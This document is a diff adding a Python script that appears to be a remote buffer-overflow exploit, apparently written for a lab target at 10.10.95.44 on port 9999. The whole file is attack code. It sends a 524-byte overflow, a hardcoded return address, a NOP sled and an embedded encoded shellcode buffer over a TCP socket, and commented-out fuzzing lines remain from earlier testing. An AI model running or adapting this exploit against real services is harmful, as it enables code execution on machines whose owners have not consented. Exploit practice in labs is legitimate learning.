@@ -1,0 +1,58 @@
+import socket
+import time
+import sys
+from pwn import p32
+
+all_chars = bytearray(range(1, 256))
+bad_chars = [
+]
+
+for bad_char in bad_chars:
+    all_chars = all_chars.replace(bad_char, b"")
+
+
+ip = "10.10.95.44"
+
+buf = b""
+buf += b"\xd9\xce\xd9\x74\x24\xf4\xb8\xda\x9e\x35\x96\x5d\x29"
+buf += b"\xc9\xb1\x1f\x31\x45\x1a\x03\x45\x1a\x83\xed\xfc\xe2"
+buf += b"\x2f\xf4\x3f\xc8\xfe\xd2\xb7\x17\x53\xa6\x64\xb2\x51"
+buf += b"\x98\xed\xcb\xb4\x15\x71\x5c\x6d\xce\x78\x6a\x91\xa6"
+buf += b"\x15\x6e\x91\xa7\xb9\xe7\x70\xad\x27\xa0\x22\x63\xff"
+buf += b"\xd9\x23\xc0\x32\x59\x26\x07\xb5\x43\x66\xfc\x7b\x1c"
+buf += b"\xd4\xfc\x83\xdc\x40\x97\x83\xb6\x75\xee\x67\x77\xbc"
+buf += b"\x3d\xe7\xfd\xfe\xc7\x55\x16\xd9\x85\xa1\x50\x25\xfa"
+buf += b"\xad\xa2\xac\x19\x6c\x49\xa2\x1c\x8c\x82\x0a\xe3\x9e"
+buf += b"\x1b\xef\xdc\x59\x0c\xb4\x55\x78\xb5\xf8\x42\xcb\xc5"
+buf += b"\x31\x0a\xae\x0a\xb1\x09\x4e\x6b\xf9\x0f\xb0\x6c\xf9"
+buf += b"\xb4\xb1\x6c\xf9\xca\x7c\xec"
+
+
+port = 9999
+timeout = 5
+offset = 524
+retn = p32(0x311712F3)
+
+
+padding = b"\x90"*40
+overflow = (offset)*b'A'
+
+string = overflow+retn+padding+buf
+
+# while True:
+# try:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.settimeout(timeout)
+    connect = s.connect((ip, port))
+    print("fuzzing with ")
+    print(len(string))
+    s.send(string+b"\r\n")
+    s.close()
+
+    # except:
+    #     print("crashed at")
+    #     print(len(string))
+    #     exit(0)
+
+    # string += 100 * b"A"
+    # time.sleep(1)
